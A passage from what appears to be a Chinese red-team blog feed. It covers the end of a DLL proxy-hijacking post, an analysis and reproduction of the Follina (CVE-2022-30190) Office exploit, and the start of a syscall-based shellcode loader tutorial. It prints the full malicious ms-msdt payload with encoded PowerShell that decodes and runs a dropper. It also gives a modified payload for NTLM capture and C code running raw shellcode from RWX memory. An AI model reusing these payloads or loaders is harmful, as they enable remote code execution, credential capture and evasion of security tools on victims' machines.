WideCharToMultiByte(CP_ACP, 0, pCMD, wcslen(pCMD), pACMD, MAX_ENV_SIZE,  NULL, NULL);        WinExec(pACMD, SW_SHOW);              */        break;    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        FreeLibrary(hL);        break;    }    return TRUE;}// the proxy DLL mappings for the linker#pragma comment(linker,  &quot;/export:SvchostPushServiceGlobals=iscsiexe_org.SvchostPushServiceGlobals&quot;)#pragma comment(linker, &quot;/export:ServiceMain=iscsiexe_org.ServiceMain&quot;)#pragma comment(linker,  &quot;/export:DiscpEstablishServiceLinkage=iscsiexe_org.DiscpEstablishServiceLinkage&quot;)</code></pre><p>原作者iscsiexe_org.dll生成过程(搞的和他妈自解压马一样，醉了)</p><pre><code>* 利用FindResource函数搜索当前进程搜索DLL资源，寻找102资源获取句柄* LoadResource搜索对应资源获取句柄* SizeofResource检索指定资源的大小* LockResource检索指向内存中指定资源的指针* 然后遍历对应DLL资源，改名为 iscsiexe_org.dll</code></pre><p>VT查杀:<a href="https://www.virustotal.com/gui/file/60004318d9a509e5bad2bda71dd11bcc0304dabe17b30a85366a73ad532aae80" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/60004318d9a509e5bad2bda71dd11bcc0304dabe17b30a85366a73ad532aae80</a><br>稍微搜了一下，dll可能是这里下的：<a href="https://www.dll-files.com/iscsiexe.dll.html" target="_blank" rel="noopener">https://www.dll-files.com/iscsiexe.dll.html</a><br><img src="https://s1.ax1x.com/2022/07/16/j4Df0K.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4DqXt.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4DhTO.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4DIte.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4D7pd.png" alt=""></p><p><img src="https://s1.ax1x.com/2022/07/16/j4DuOP.png" alt=""></p><p>win7测试<br><img src="https://s1.ax1x.com/2022/07/16/j4DMef.png" alt=""></p><p>win10测试<br><img src="https://s1.ax1x.com/2022/07/16/j4DQw8.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2022-30190 样本分析与漏洞复现</title>
      <link href="/posts/e94de9d7.html"/>
      <url>/posts/e94de9d7.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期新爆出的漏洞office的day，利用msdt+远程加载<br>CVE:CVE-2022-30190<br><img src="https://s1.ax1x.com/2022/06/01/XGNEqI.png" alt=""><br>样本地址：<a href="https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/#" target="_blank" rel="noopener">https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/#</a></p><h2 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h2><p>无VBA，远程加载<br><img src="https://s1.ax1x.com/2022/06/01/XGNZZt.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNedP.png" alt=""></p><p>doc改名zip解压，搜索远程加载的地址定位到word_rels\document.xml.rels<br><img src="https://s1.ax1x.com/2022/06/01/XGNui8.png" alt=""></p><p>通过查看app.any.run沙箱捕获的请求地址内容，查看如下<br><img src="https://s1.ax1x.com/2022/06/01/XGNKJS.png" alt=""></p><p>中间的内容是一段powershell，解码后如下</p><pre><code>&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;body&gt;&lt;script&gt;//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    window.location.href = &quot;ms-msdt:/id PCWDiagnostic /skip force /param \&quot;IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression(&#39;[System.Text.Encoding]&#39;+[char]58+[char]58+&#39;UTF8.GetString([System.Convert]&#39;+[char]58+[char]58+&#39;FromBase64String(&#39;+[char]34+&#39;JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw==&#39;+[char]34+&#39;))&#39;))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\&quot;&quot;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;////////////////////powershell IEX运行$(Invoke-Expression($(Invoke-Expression(&#39;[System.Text.Encoding]&#39;+[char]58+[char]58+&#39;UTF8.GetString([System.Convert]&#39;+[char]58+[char]58+&#39;FromBase64String(&#39;+[char]34+&#39;JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traWxsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9yICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAveSYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLnQgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw==&#39;+[char]34+&#39;))&#39;))))///////////////////base64解码内容：$cmd = &quot;c:\windows\system32\cmd.exe&quot;;Start-Process $cmd -windowstyle hidden -ArgumentList &quot;/c taskkill /f /im msdt.exe&quot;; # 隐藏窗口杀死msdt.exeStart-Process $cmd -windowstyle hidden -ArgumentList &quot;/c cd C:\users\public\&amp;&amp;for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&amp;&amp;findstr TVNDRgAAAA 1.rar&gt;1.t&amp;&amp;certutil -decode 1.t 1.c &amp;&amp;expand 1.c -F:* .&amp;&amp;rgb.exe&quot;; # 进入public目录，循环遍历 RAR 文件中的文件，查找编码 CAB文件的 Base64 字符串将此 Base64 编码的 CAB 文件存储为1.t解码Base64编码的CAB文件保存为1.c将1.c CAB文件展开到当前目录，最后：执行rgb.exe（大概压缩在1.c CAB文件里面）</code></pre><p>运行了rgb.exe后会释放几个文件，最后调用csc编译<br>(cs太长了就不贴出来了)<br><img src="https://s1.ax1x.com/2022/06/01/XGNMRg.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGN1Mj.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGN8Ln.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNUiT.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNdWF.png" alt=""></p><p>msdt微软官方参数解释如下：<br><img src="https://s1.ax1x.com/2022/06/01/XGNBQJ.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNDy9.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNrLR.png" alt=""></p><p>param参数貌似微软没公开怎么调用，只给了架构图<br><img src="https://s1.ax1x.com/2022/06/01/XGNye1.png" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>参考链接：<br><a href="https://huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug" target="_blank" rel="noopener">https://huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug</a><br><a href="https://benjamin-altpeter.de/shell-openexternal-dangers/" target="_blank" rel="noopener">https://benjamin-altpeter.de/shell-openexternal-dangers/</a><br><a href="https://github.com/JohnHammond/msdt-follina" target="_blank" rel="noopener">https://github.com/JohnHammond/msdt-follina</a></p><p>tips:<strong>html注释内容不能少于4096字节</strong><br>将原payload修改为以下可以远程请求获取NTLM</p><pre><code>ms-msdt:-id PCWDiagnostic /moreoptions false /skip true /param IT_BrowseForFile=&quot;\\\\192.168.92.129\\sharp\\calc.exe&quot; /param IT_SelectProgram=&quot;NotListed&quot; /param IT_AutoTroubleshoot=&quot;ts_AUTO&quot;</code></pre><p><img src="https://s1.ax1x.com/2022/06/01/XGN2FK.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGNWWD.png" alt=""></p><p>执行命令和上线<br><img src="https://s1.ax1x.com/2022/06/01/XGNhSe.png" alt=""><br><img src="https://s1.ax1x.com/2022/06/01/XGN5yd.png" alt=""></p><p>踩坑：powershell语句太长base64编码执行不成功报错如下<br><img src="https://s1.ax1x.com/2022/06/01/XGNHTP.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 样本分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>syscall学习</title>
      <link href="/posts/87f73904.html"/>
      <url>/posts/87f73904.html</url>
      <content type="html"><![CDATA[<p>好久没写博客了，工作和在学校的自由完全比不了。怀念初中的她怀念大学无拘无束的生活….<br>如今大家都各自毕业，今生能否相见仍成问题<br><img src="https://s1.ax1x.com/2022/04/09/LCzKZ6.jpg" alt=""></p><h2 id="syscall和正常调用的区别"><a href="#syscall和正常调用的区别" class="headerlink" title="syscall和正常调用的区别"></a>syscall和正常调用的区别</h2><p>正常使用WIN API:ntdll-&gt;kernelBase.dll-&gt;kerlnel32.dll<br>SYSCALL:内核函数直接调用 (不会通过Loadlibrary+GetprocAddress调用下一级DLL的API函数，直接进行调用)</p><p>下图可以更好的理解<br>正常API调用过程如下<br>（可以看到调用VirtualAlloc的流程是，Kernel32.dll!VirtualAlloc-&gt;KernelBase.dll!VirtualAllocEx-&gt;Ntdll!NtAllocateVirtualMemory）<br><img src="https://s1.ax1x.com/2022/04/09/LCzQIO.png" alt=""></p><p>SYSCALL调用则不会有下级DLL加载调用API函数<br><img src="https://s1.ax1x.com/2022/04/09/LCz3Je.png" alt=""></p><h2 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h2><p>这次主要将VirtualAlloc改成Syscall<br>（下图直接编译运行则和图一一样，调用下层DLL进行调用）<br>源代码：</p><pre><code class="C">#include &lt;stdio.h&gt;#include &lt;windows.h&gt;int main(){    unsigned char buf[] =            &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;            &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;            &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;            &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;            &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;            &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;            &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;            &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;            &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;            &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;            &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;            &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;            &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;            &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;            &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;            &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;            &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;            &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;            &quot;\x63\x2e\x65\x78\x65\x00&quot;;    size_t size = sizeof(buf);    void *sc = VirtualAlloc(0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);    if (sc == NULL)    {        return 0;    }    memcpy(sc, buf, size);    (*(int(*)()) sc)();    return 0;}</code></pre><p>那么要怎么找到VirtualAlloc的底层API呢？通过API Monitor监视API。可以发现（也方便待会syscall照着修改代码）</p><pre><code>* ntdll.dll中保存着执行功能的函数以及系统服务调用存根，ntdll.dll导出了Windows Native API，其具体实现其实在 ntoskrnl.exe 中</code></pre><p>利用windbg获取下层API的参数结构</p><pre><code>x ntdll!NtAllocateVirtualMemory #从dll搜索API函数u &lt;address&gt; #查看地址对应的汇编</code></pre><p><img src="https://s1.ax1x.com/2022/04/09/LCzYQA.png" alt=""></p><p>这段汇编可以理解为将rcx参数指针的值保存到r10，然后将系统调用号传入给eax。计算内存偏移地址里的值，根据标志寄存器的大小来决定是否要跳转到ntdll!NtAllocateVirtualMemory。最后syscall进入内核调用内核函数</p><p>引用一张图<br><img src="https://s1.ax1x.com/2022/04/09/LCztsI.png" alt=""></p><p>我们只需要取</p><pre><code>mov     r10,rcxmov     eax,18hsyscallret</code></pre><p>然后丢进ASM，创建函数。在实例化调用即可<br>syscall.asm</p><pre><code>.codeNtAllocateVirtualMemory procmov r10,rcxmov eax,18hsyscallretNtAllocateVirtualMemory endpend</code></pre><p><img src="https://s1.ax1x.com/2022/04/09/LCzNLt.png" alt=""></p><p>设置ASM属性<br><img src="https://s1.ax1x.com/2022/04/09/LCzaeP.png" alt=""></p><p>导出该函数</p><pre><code>EXTERN_C  NTSTATUS NtAllocateVirtualMemory(    HANDLE    ProcessHandle,    PVOID* BaseAddress,    ULONG_PTR ZeroBits,    PSIZE_T   RegionSize,    ULONG     AllocationType,    ULONG     Protect);</code></pre><p>完整代码如下：<br>（NtAllocateVirtualMemory对着监视的API填就行了）</p><pre><code class="C">// syscalltest.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;EXTERN_C  NTSTATUS NtAllocateVirtualMemory(    HANDLE    ProcessHandle,    PVOID* BaseAddress,    ULONG_PTR ZeroBits,    PSIZE_T   RegionSize,    ULONG     AllocationType,    ULONG     Protect);int main(){    unsigned char buf[] =        &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;        &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;        &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;        &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;        &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;        &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;        &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;        &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;        &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;        &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;        &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;        &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;        &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;        &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;        &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;        